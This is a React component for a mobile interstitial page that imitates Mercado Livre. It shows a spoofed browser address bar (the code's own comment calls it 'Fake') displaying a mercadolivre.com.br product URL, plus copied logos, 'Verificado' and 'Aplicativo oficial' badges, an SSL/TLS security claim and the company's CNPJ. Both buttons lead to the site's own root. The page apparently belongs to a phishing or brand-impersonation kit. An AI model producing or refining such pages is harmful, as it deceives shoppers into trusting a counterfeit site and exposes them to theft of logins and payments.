import { useEffect, useState } from "react";
import { useLocation } from "wouter";

export default function RedirectPage() {
  const [, navigate] = useLocation();
  const [dots, setDots] = useState(".");

  useEffect(() => {
    const t = setInterval(() => {
      setDots((d) => (d.length >= 3 ? "." : d + "."));
    }, 450);
    return () => clearInterval(t);
  }, []);

  function handleOpen() {
    navigate("/");
  }

  function handleStay() {
    navigate("/");
  }

  return (
    <div className="min-h-screen bg-[#F5F5F5] flex flex-col items-center justify-between max-w-[480px] mx-auto">

      {/* Fake browser address bar */}
      <div className="w-full bg-[#3C4043] px-3 py-2 flex items-center gap-2">
        <div className="flex items-center gap-1 shrink-0">
          <div className="w-2 h-2 rounded-full bg-[#5F6368]" />
          <div className="w-2 h-2 rounded-full bg-[#5F6368]" />
        </div>
        <div className="flex-1 bg-[#2A2D30] rounded-full px-3 py-1.5 flex items-center gap-1.5">
          <svg viewBox="0 0 24 24" className="w-3 h-3 text-[#34A853] shrink-0" fill="currentColor">
            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
          </svg>
          <span className="text-[11px] text-[#9AA0A6] truncate font-mono">
            produto.mercadolivre.com.br/MLB-4089...
          </span>
        </div>
      </div>

      {/* Main content */}
      <div className="flex-1 flex flex-col items-center justify-center w-full px-6 pb-8">

        {/* Loading pulse ring */}
        <div className="relative mb-8">
          <div className="w-24 h-24 rounded-2xl bg-[#FFE600] shadow-lg flex items-center justify-center">
            <svg viewBox="0 0 80 28" className="w-14" fill="none">
              <text x="0" y="22" fontFamily="'Helvetica Neue', Arial, sans-serif" fontWeight="800" fontSize="22" fill="#333333">
                mercado
              </text>
              <text x="0" y="27" fontFamily="'Helvetica Neue', Arial, sans-serif" fontWeight="800" fontSize="10" fill="#333333" letterSpacing="0.5">
                livre
              </text>
            </svg>
          </div>
          <div className="absolute -inset-2 rounded-3xl border-2 border-[#FFE600]/40 animate-ping" />
        </div>

        {/* App info */}
        <p className="text-[13px] text-gray-400 font-medium mb-1 tracking-wide uppercase">
          Abrindo em
        </p>
        <h1 className="text-xl font-bold text-gray-900 mb-1">Mercado Livre</h1>
        <p className="text-[13px] text-gray-500 mb-8">
          Verificando disponibilidade{dots}
        </p>

        {/* Divider */}
        <div className="w-full border-t border-gray-200 mb-8" />

        {/* Message card */}
        <div className="w-full bg-white rounded-2xl shadow-sm border border-gray-100 p-5 mb-6">
          <div className="flex items-center gap-3 mb-4">
            <div className="w-10 h-10 rounded-xl bg-[#FFE600] flex items-center justify-center shrink-0">
              <svg viewBox="0 0 40 14" className="w-7" fill="none">
                <text x="0" y="11" fontFamily="'Helvetica Neue', Arial, sans-serif" fontWeight="800" fontSize="11" fill="#333333">
                  mercado
                </text>
              </svg>
            </div>
            <div>
              <p className="text-sm font-semibold text-gray-900">Mercado Livre</p>
              <p className="text-xs text-gray-400">Aplicativo oficial</p>
            </div>
            <div className="ml-auto flex items-center gap-1">
              <svg viewBox="0 0 24 24" className="w-4 h-4 text-[#34A853]" fill="currentColor">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
              </svg>
              <span className="text-xs text-[#34A853] font-semibold">Verificado</span>
            </div>
          </div>

          <p className="text-sm text-gray-700 leading-relaxed mb-1">
            <span className="font-semibold text-gray-900">Abra o aplicativo oficial</span>{" "}
            do Mercado Livre no seu celular para continuar com segurança.
          </p>
          <p className="text-xs text-gray-400 mt-2 flex items-center gap-1">
            <svg viewBox="0 0 24 24" className="w-3 h-3 shrink-0" fill="currentColor">
              <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
            </svg>
            Conexão segura · SSL/TLS
          </p>
        </div>

        {/* CTA Button */}
        <button
          onClick={handleOpen}
          className="w-full h-13 py-3.5 rounded-xl bg-[#3483FA] hover:bg-[#2968c8] active:scale-[0.98] text-white font-semibold text-base transition-all shadow-md shadow-blue-200 flex items-center justify-center gap-2"
        >
          <svg viewBox="0 0 24 24" className="w-5 h-5" fill="currentColor">
            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
          </svg>
          Abrir
        </button>

        {/* Secondary */}
        <button
          onClick={handleStay}
          className="mt-4 text-sm text-[#3483FA] font-medium py-2"
        >
          Continuar no navegador
        </button>

      </div>

      {/* Footer */}
      <div className="w-full px-6 pb-8 flex flex-col items-center gap-2">
        <div className="flex items-center gap-2">
          <div className="w-5 h-5 rounded bg-[#FFE600] flex items-center justify-center">
            <svg viewBox="0 0 10 7" className="w-3" fill="none">
              <text x="0" y="6" fontFamily="sans-serif" fontWeight="800" fontSize="6" fill="#333">ML</text>
            </svg>
          </div>
          <span className="text-xs text-gray-400">© 2025 Mercado Livre S.R.L.</span>
        </div>
        <p className="text-[10px] text-gray-300 text-center leading-relaxed">
          Todos os direitos reservados · CNPJ 03.007.331/0001-41
        </p>
      </div>

    </div>
  );
}
